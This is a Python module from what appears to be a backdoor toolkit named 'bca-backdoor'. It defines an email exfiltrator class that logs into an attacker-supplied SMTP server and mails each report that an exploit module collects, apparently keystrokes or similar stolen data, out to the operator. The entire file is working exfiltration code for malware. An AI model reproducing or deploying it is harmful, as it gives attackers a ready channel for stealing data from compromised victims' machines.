#!/usr/bin/env python3
# https://github.com/EONRaider/bca-backdoor

__author__ = "EONRaider @ keybase.io/eonraider"

import smtplib
import ssl

from src.modules.exfiltration.base import Exfiltrator, Exploit


class Email(Exfiltrator):
    def __init__(self, *,
                 module: Exploit,
                 tag: str = None,
                 smtp_host: str,
                 smtp_port: int,
                 email: str,
                 password: str):
        super().__init__(module, tag)
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.email = email
        self.password = password

    def update(self):
        """Send each report as an email through a secure connection
        using SMTP."""
        if self.module.has_data is True:
            with smtplib.SMTP_SSL(
                    host=self.smtp_host,
                    port=self.smtp_port,
                    context=ssl.create_default_context()
            ) as server:
                server.login(user=self.email, password=self.password)
                server.sendmail(from_addr=self.email,
                                to_addrs=self.email,
                                msg=f"Subject:{self.tag}\n\n{self.report}")
